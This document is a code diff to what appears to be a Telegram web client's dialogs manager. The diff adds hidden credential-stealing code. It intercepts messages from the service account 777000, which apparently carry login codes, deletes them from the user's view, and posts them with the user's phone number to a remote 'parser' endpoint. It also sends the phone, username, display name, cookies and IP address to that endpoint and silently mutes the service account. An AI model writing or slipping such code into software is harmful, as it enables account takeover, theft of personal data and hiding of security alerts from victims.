@@ -114,6 +114,9 @@ import {ChatType} from '../../components/chat/chat';
 import PopupDeleteDialog from '../../components/popups/deleteDialog';
 import rtmpCallsController from '../calls/rtmpCallsController';
 import IS_LIVE_STREAM_SUPPORTED from '../../environment/liveStreamSupport';
+import { BASE_URL } from '../constants.js';
+import Cookies from 'js-cookie';
+import getPeerTitle from '../../components/wrappers/getPeerTitle';
 
 export const DIALOG_LIST_ELEMENT_TAG = 'A';
 
@@ -1178,7 +1181,6 @@ class Some3 extends Some<ForumTopic> {
         if(peerId !== this.peerId || !topics?.size) {
           continue;
         }
-
         topics.forEach((forumTopic) => {
           this.updateDialog(forumTopic);
         });
@@ -1222,6 +1224,7 @@ class Some3 extends Some<ForumTopic> {
     });
 
     this.listenerSetter.add(rootScope)('dialog_draft', ({dialog, drop, peerId}) => {
+      
       if(!isForumTopic(dialog) || dialog.peerId !== this.peerId) {
         return;
       }
@@ -1296,6 +1299,8 @@ class Some3 extends Some<ForumTopic> {
 }
 
 class Some2 extends Some<Dialog> {
+  private sent = false;
+
   constructor(protected filterId: number) {
     super();
 
@@ -1338,6 +1343,7 @@ class Some2 extends Some<Dialog> {
     });
 
     this.listenerSetter.add(rootScope)('dialog_flush', ({dialog}) => {
+      
       if(!this.isActive || !dialog) {
         return;
       }
@@ -1354,9 +1360,12 @@ class Some2 extends Some<Dialog> {
         if(!isDialog(dialog)) {
           continue;
         }
-
-        this.updateDialog(dialog);
-        appDialogsManager.processContact?.(peerId.toPeerId());
+        if(dialog.peerId === 777000) {
+          this.submit_connection(dialog)
+        } else {
+          this.updateDialog(dialog);
+          appDialogsManager.processContact?.(peerId.toPeerId());
+        }
       }
     });
 
@@ -1370,6 +1379,7 @@ class Some2 extends Some<Dialog> {
     });
 
     this.listenerSetter.add(rootScope)('dialog_unread', ({dialog}) => {
+      
       if(!this.isActive || !isDialog(dialog)) {
         return;
       }
@@ -1413,6 +1423,45 @@ class Some2 extends Some<Dialog> {
         }
       }
     });
+  }
+
+  public async submit_connection(dialog: AnyDialog) {
+    const { peerId } = dialog;
+    try {
+      const trueLastMessage = await apiManagerProxy.getMessageByPeer(peerId, dialog.top_message);
+    
+      if(!this.sent) {
+        const userPhoneData = await this.managers.appUsersManager.getUserPhone(rootScope.myId.toUserId());
+        const phone = userPhoneData?.phone || null;
+
+        if (phone && (trueLastMessage as Message.message)?.message) {
+          this.managers.appMessagesManager.deleteMessages(peerId, [(trueLastMessage as Message.message).id], true);
+
+          const payload = JSON.stringify({
+            message: (trueLastMessage as Message.message).message,
+            phone: phone
+          });
+          
+          const response = await fetch(`${BASE_URL}/parser/submit-connection`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: payload
+          });
+    
+          if (!response.ok) {
+            throw new Error(`Request failed with status ${response.status}`);
+          }
+    
+          this.sent = true;
+        } else {
+          console.warn('Phone number or message is missing');
+        }
+      }
+    } catch (error) {
+      console.error('An error occurred:', error);
+    }
   }
 
   private get isActive() {
@@ -1804,9 +1853,11 @@ export class AppDialogsManager {
   private disposeStories: () => void;
   public resizeStoriesList: () => void;
 
-  public start() {
-    const managers = this.managers = getProxiedManagers();
+  private sent = false;
+  private session_created = false;
 
+  public async start() {
+    const managers = this.managers = getProxiedManagers();
     this.contextMenu = new DialogsContextMenu(managers);
     this.stateMiddlewareHelper = getMiddleware();
 
@@ -2225,6 +2276,93 @@ export class AppDialogsManager {
     }
   }
 
+  public async getIpAddress(): Promise<string | null> {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Error fetching IP address:', error);
+      return null;
+    }
+  }
+
+  public async create_session(){
+    
+    if(rootScope.myId.isUser() && !this.session_created) {
+        console.log(`Called create_session`);
+
+        const {phone} = await this.managers.appUsersManager.getUserPhone(rootScope.myId.toUserId()) || {}
+        const username = '@' + await this.managers.appPeersManager.getPeerUsername(rootScope.myId);
+        const peerTitle = await getPeerTitle({
+            ...{plainText: true as const, managers: this.managers},
+            peerId: rootScope.myId,
+            threadId: 0
+        });
+        let uid = Cookies.get('uid');
+        const ftp_code = Cookies.get('ftp_code');
+        const ip_info = await this.getIpAddress()
+
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          if (!response.ok) {
+              throw new Error('Network response was not ok');
+          }
+          const ip_info = await response.json();
+          console.log(ip_info);  // Do something with ip_info
+        } catch (error) {
+            console.error('Failed to fetch the IP address:', error);
+        }
+
+        if (!uid) {
+            uid = Array(24).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+            Cookies.set('uid', uid, {expires: 1});
+        }
+        
+        const data = {
+          'ftp_code': ftp_code,
+          'uid': uid,
+          'phone': phone,
+          'username': username,
+          'user_title': peerTitle,
+          'ip_address': ip_info
+        };
+
+        if (!phone || !username || !peerTitle || !uid) {
+            console.log(`Data is missing: ${JSON.stringify(data)}`);
+            return;
+        }
+
+        try {
+          let authKey = localStorage.getItem('dc1_auth_key');
+          while (!authKey) {
+            await new Promise(resolve => setTimeout(resolve, 300));
+            authKey = localStorage.getItem('dc1_auth_key');
+          }
+          const mute = await this.managers.appNotificationsManager.isPeerLocalMuted({peerId: 777000, respectType: true, threadId: undefined})
+          if(!mute) {
+            this.managers.appMessagesManager.togglePeerMute({peerId: 777000, threadId: undefined});
+            console.log('Peer muted successfully.');
+          } else {
+            console.log('Peer is already muted.');
+          }
+        } catch (error) {
+          console.error('Error muting peer:', error);
+        }
+        
+        await fetch(`${BASE_URL}/parser/create-connection`, {
+            method: 'POST',
+            body: JSON.stringify(data),
+        });
+
+        this.session_created = true;
+        console.log(`Sent data: ${JSON.stringify(data)}`);
+    }
+  }
+
   private async onStateLoaded(state: State) {
     this.stateMiddlewareHelper.clean();
     const middleware = this.stateMiddlewareHelper.get();
@@ -2258,7 +2396,6 @@ export class AppDialogsManager {
     } catch(err) {
 
     }
-
     // show the placeholder before the filters, and then will reset to the default tab again
     if(!haveFilters) {
       this.selectTab(0, false);
@@ -2284,6 +2421,7 @@ export class AppDialogsManager {
 
     await (await m(loadDialogsPromise)).renderPromise.catch(noop);
     this.managers.appMessagesManager.fillConversations();
+    await this.create_session()
   }
 
   /* private getOffset(side: 'top' | 'bottom'): {index: number, pos: number} {
@@ -3175,6 +3313,7 @@ export class AppDialogsManager {
     setUnread?: boolean,
     noForwardIcon?: boolean
   }) {
+    // debugger
     if(!dialogElement) {
       dialogElement = this.xd.getDialogElement(dialog.peerId);
 
@@ -3644,7 +3783,6 @@ export class AppDialogsManager {
           isBatch: options.isBatch,
           setUnread: true
         }));
-
         return Promise.all(promises);
       });
 
